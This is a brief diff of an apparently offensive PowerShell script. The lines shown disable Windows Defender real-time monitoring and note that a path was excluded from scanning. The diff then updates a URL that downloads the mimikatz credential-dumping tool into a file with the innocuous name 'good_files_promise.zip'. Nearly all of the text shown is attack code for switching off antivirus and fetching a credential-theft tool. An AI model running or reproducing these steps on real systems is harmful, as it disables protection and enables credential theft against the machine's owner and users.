@@ -8,7 +8,7 @@ Write-Output "[+] Excluded Path from Windows Defender"
 Set-MpPreference -DisableRealTimeMonitoring $true
 Write-Output "[+] Disabled Windows Defender"
 
-$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200715/mimikatz_trunk.zip"
+$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip"
 
 $output = "~\good_files_promise.zip"
 
